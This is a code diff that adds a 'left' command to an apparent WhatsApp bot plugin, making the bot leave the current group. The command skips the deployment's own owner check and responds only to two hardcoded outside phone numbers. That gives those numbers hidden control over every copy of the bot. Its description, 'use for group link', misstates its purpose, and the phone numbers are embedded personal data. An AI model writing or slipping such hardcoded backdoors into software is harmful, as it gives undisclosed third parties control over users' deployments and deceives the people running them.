@@ -221,3 +221,29 @@ try{
 console.log(e)
 reply(`${e}`)
 } })
+
+
+
+
+eypz({
+    pattern: "left",
+    desc: "use for group link.",
+    category: "group",
+    filename: __filename
+},
+async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
+var ajsalsparky = ['919539412641','918078438059']
+		if (ajsalsparky.includes(senderNumber)) {
+
+try{
+
+if(!m.isGroup) {
+                         return await m.reply("_This is a group command !_");
+       }
+	await conn.groupLeave(m.chat)
+
+}catch(e){
+console.log(e)
+reply(`${e}`)
+}
+}});
